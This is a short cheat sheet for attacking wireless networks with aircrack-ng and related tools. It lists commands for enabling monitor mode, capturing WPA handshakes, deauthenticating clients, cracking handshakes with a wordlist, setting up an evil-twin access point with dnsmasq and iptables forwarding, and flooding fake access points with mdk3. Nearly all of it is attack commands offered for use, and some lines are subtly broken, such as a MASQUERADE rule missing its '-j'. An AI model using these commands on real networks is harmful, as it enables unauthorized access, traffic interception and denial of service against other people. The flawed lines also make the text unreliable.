Start Wireless Network Hacking with Aircrack-ng


>> Scanning

For scanning around network you need to enable monitor mode on your wireless network adapter.

  1. Airmon-ng:
    2.  To start monitor mode cmd,

    $ airmon-ng start {interface name}
    Example: airmon-ng start wlan0

    To stop monitor mode cmd,

    $ airmon-ng stop {interface name}
    Example: airmon-ng stop wlan0

• Scanning Network

  • Airodump-ng
  • To see available wireless network
    $ airodump-ng {interface}

  • wash
  • Using wash type cmd,

    $ wash -i {interface}

>> Gaining Access

• Capture Handshake

  • Capture Handshake with airodump-ng

    airodump-ng --bssid {BSSID} --channel {ch_number} --write {file_name} {interface}

• Deauthenticate Targets from network

  • Aireplay-ng
  • To Deauthenticate Target

    • $ aireplay-ng --deauth {num_pckt} -a {router_bssid} -c {target_bssid} {interface}

• Crack Handshake File

  • Aircrack-ng
  • To Crack Captured Handshake File, you need to a wordlist. Then type this cmd,

    • $ aircrack-ng {handshake_file} -w {wordlist}


Evil Twin Attack

>> Create a fake access point

Commands:

  • echo -e "interface=at0\ndhcp-range=192.168.0.50,192.168.0.150,12h" > /etc/dnsmasq.conf
  • airbase-ng -e [AP Name] -c [Channel] [Interface]
    eg: airbase-ng -e FreeWiFi -c 6 wlan1
  • ifconfig at0 192.168.0.1 up
  • iptables --flush
  • iptables --table nat --flush
  • Iptables --delete-chain
  • iptables -P FORWARD ACCEPT
  • iptables -t nat -A POSTROUTING -o wlan0 MASQUERADE

  • dnsmasq
  • echo 1 > /proc/sys/net/ipv4/ip_forward

>> Create Multiple Fake AP

Commands:

  • mdk3 [interface] -b -c [channel] -f [BSSID file]
    eg: mdk3 wlan0 -b -c 1 -f /sdcard/kali/fake_ap.txt
